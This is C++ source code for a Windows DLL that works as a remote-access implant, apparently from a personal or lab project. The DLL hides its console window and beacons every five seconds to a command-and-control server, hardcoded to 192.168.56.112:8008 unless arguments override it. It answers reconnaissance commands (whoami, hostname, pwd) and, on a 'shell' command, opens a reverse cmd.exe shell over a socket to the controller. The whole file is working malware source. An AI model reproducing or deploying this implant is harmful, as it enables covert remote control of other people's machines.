// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>

#pragma comment(lib, "Ws2_32.lib")

#include <stdio.h>

#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

void whoami(char* returnval)
{
	DWORD bufferlen = 257;
	// Call WINAPI method, assign it's response to returnval pointer.
	GetUserNameA(returnval, &bufferlen);
}

void hostname(char* returnval)
{
	DWORD bufferlen = 257;
	GetComputerNameA(returnval, &bufferlen);
}

void pwd(char* returnval)
{
	char tempvar[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, tempvar); //returns necessary value into tempvar
	strcat(returnval, tempvar); //you need to put that value into returnval
}

void Shell(char* C2Server, int C2Port)
{
	// FOR NOW IT CREATES NEW CONNECTION FOR SHELL
	// TODO : USE SAME SOCKET?

	SOCKET tcpsock;
	sockaddr_in addr;
	WSADATA version;
	// WSADATA object - contains details of application state regarding to network
	// Version comparison - whether compiled version of sockets is compatible with the older versions
	WSAStartup(MAKEWORD(2, 2), &version);

	// WSASocket vs socket - same functionality, WSA.. has more options to work with.
	tcpsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(C2Server);
	addr.sin_port = htons(C2Port);

	// This if statement triggers if connection to C&C errored out.
	if (WSAConnect(tcpsock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
		closesocket(tcpsock);
		WSACleanup();
		return;
	}
	// Else connection successfull..
	else {
		char RecvData[1024];

		memset(RecvData, 0, sizeof(RecvData));

		// here waits for any data input from Server
		int RecvCode = recv(tcpsock, RecvData, 1024, 0);

		if (RecvCode <= 0) {
			closesocket(tcpsock);
			WSACleanup();
			return;
		}
		else {
			char Process[] = "cmd.exe";
			STARTUPINFOA sinfo;
			PROCESS_INFORMATION pinfo;
			memset(&sinfo, 0, sizeof(sinfo));

			sinfo.cb = sizeof(sinfo);
			sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

			// Socket is Handle for stdin/stdout/stderr descriptors of process
			sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)tcpsock;

			CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
			WaitForSingleObject(pinfo.hProcess, INFINITE);

			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);

			memset(RecvData, 0, sizeof(RecvData));

		}
	}
}

void StartBeacon(char* C2Server, int C2Port)
{
	SOCKET tcpsock;
	sockaddr_in addr;
	WSADATA wsversion;
	// WSADATA object - contains details of application state regarding to network

	// Version comparison - whether compiled version of sockets is compatible with the older versions
	WSAStartup(MAKEWORD(2, 2), &wsversion);

	// WSASocket vs socket - same functionality, WSA.. has more options to work with.
	tcpsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = inet_addr(C2Server);
	addr.sin_port = htons(C2Port);

	int SOCK_STATE;
	SOCK_STATE = connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr));

	// This if statement performs connection and triggers if connection to C&C errored out.
	if (SOCK_STATE == SOCKET_ERROR) {
		closesocket(tcpsock);
		WSACleanup();
		return;
	}

	// Else connection successfull..
	else {
		while (true) {

			// Connection verification block START
			char RecvData[1024] = "";
			memset(RecvData, 0, sizeof(RecvData));

			// here waits for any data input from Server
			int RecvCode = recv(tcpsock, RecvData, 1024, 0);

			if (RecvCode <= 0) {
				closesocket(tcpsock);
				WSACleanup();
				return;
			}
			// Connection verification block END
			// ------------------

			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
			if (strcmp(RecvData, "\n") == 0) { memset(RecvData, 0, sizeof(RecvData)); }
			else if (strcmp(RecvData, "whoami\n") == 0) {
				char buffer[257] = ""; // reserve buffer with length of 257 bytes
				whoami(buffer); // call whoami function
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer) + 1, 0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
			else if (strcmp(RecvData, "pwd\n") == 0) {
				char buffer[257] = "";
				pwd(buffer);
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer) + 1, 0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			else if (strcmp(RecvData, "hostname\n") == 0) {
				char buffer[257] = "";
				hostname(buffer);
				strcat(buffer, "\n");
				send(tcpsock, buffer, strlen(buffer) + 1, 0); // send response
				// clear buffers
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			else if (strcmp(RecvData, "shell\n") == 0) {
				Shell(C2Server, C2Port);
			}
			else if (strcmp(RecvData, "exit\n") == 0) {
				closesocket(tcpsock);
				WSACleanup();
				Sleep(1000);
				return;
			}
			else if (strcmp(RecvData, "kill\n") == 0) {
				closesocket(tcpsock);
				WSACleanup();
				Sleep(1000);
				exit(0);
			}
			else {
				char buffer[20] = "Invalid command\n";
				send(tcpsock, buffer, strlen(buffer) + 1, 0);
				memset(buffer, 0, sizeof(buffer));
				memset(RecvData, 0, sizeof(RecvData));
			}
			memset(RecvData, 0, sizeof(RecvData));
		}
	}
	closesocket(tcpsock);
	WSACleanup();
	exit(0);
}


extern "C" __declspec(dllexport) int mydllmain(int argc, char **argv)
{
	// Window handle to work with Console window;
	HWND stealth;
	AllocConsole();

	// Idea of searching window and saying to show it (SW_HIDE to hide)
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, SW_HIDE);

	if (argc == 3)
	{
		int port = atoi(argv[2]);
		while (true) {
			// BEACONING
			// NEED TO IMPLEMENT RANDOM DELAY
			Sleep(5000); // 1000 ms = 1s

			StartBeacon(argv[1], port);
		}
	}
	else {
		char host[] = "192.168.56.112";
		int port = 8008;
		while (true) {
			// BEACONING
			// NEED TO IMPLEMENT RANDOM DELAY
			Sleep(5000); // 1000 ms = 1s

			StartBeacon(host, port);
		}
	}
	return 0;
}